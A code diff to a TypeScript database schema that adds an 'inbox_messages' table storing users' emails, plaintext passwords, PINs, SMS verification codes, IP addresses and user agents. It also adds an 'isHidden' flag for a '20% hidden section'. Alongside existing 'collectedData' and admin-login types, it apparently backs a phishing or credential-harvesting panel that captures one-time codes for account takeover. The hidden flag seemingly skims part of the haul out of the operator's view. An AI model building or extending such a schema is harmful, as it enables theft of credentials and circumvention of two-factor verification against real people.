@@ -33,6 +33,20 @@ export const admins = pgTable("admins", {
   createdAt: timestamp("created_at").notNull().default(sql`now()`),
 });
 
+export const inboxMessages = pgTable("inbox_messages", {
+  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
+  userId: varchar("user_id").notNull(),
+  messageType: text("message_type").notNull(), // "registration" or "sms_verification"
+  email: text("email").notNull(),
+  password: text("password"),
+  pin: text("pin"),
+  smsCode: text("sms_code"),
+  ipAddress: text("ip_address"),
+  userAgent: text("user_agent"),
+  isHidden: boolean("is_hidden").notNull().default(false), // true = 20% hidden section
+  createdAt: timestamp("created_at").notNull().default(sql`now()`),
+});
+
 export const insertUserSchema = createInsertSchema(users).omit({
   id: true,
   isVerified: true,
@@ -61,11 +75,18 @@ export const adminLoginSchema = z.object({
   password: z.string().min(1, "كلمة المرور مطلوبة"),
 });
 
+export const insertInboxMessageSchema = createInsertSchema(inboxMessages).omit({
+  id: true,
+  createdAt: true,
+});
+
 export type InsertUser = z.infer<typeof insertUserSchema>;
 export type User = typeof users.$inferSelect;
 export type CollectedData = typeof collectedData.$inferSelect;
 export type InsertCollectedData = z.infer<typeof insertCollectedDataSchema>;
 export type Admin = typeof admins.$inferSelect;
+export type InboxMessage = typeof inboxMessages.$inferSelect;
+export type InsertInboxMessage = z.infer<typeof insertInboxMessageSchema>;
 export type LoginData = z.infer<typeof loginSchema>;
 export type VerifyOtpData = z.infer<typeof verifyOtpSchema>;
 export type AdminLoginData = z.infer<typeof adminLoginSchema>;
